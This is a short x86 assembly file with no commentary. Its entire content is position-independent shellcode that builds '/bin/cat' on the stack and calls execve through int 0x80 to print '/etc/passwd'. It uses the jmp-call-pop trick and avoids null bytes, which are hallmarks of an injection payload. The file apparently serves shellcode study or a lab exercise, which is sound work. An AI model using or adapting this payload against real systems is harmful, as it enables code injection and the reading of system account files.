        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop esi
        xor ecx, ecx
        mov cl, [esi]
        inc esi
        mov [esi+ecx], ch
main:
        push 11
        pop eax
        cdq
        push edx
        push 0x7461632f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push esi
        push ebx
        mov ecx, esp
        int 0x80
caller:
        call callee
arg:
        .byte 11
        .ascii "/etc/passwd"
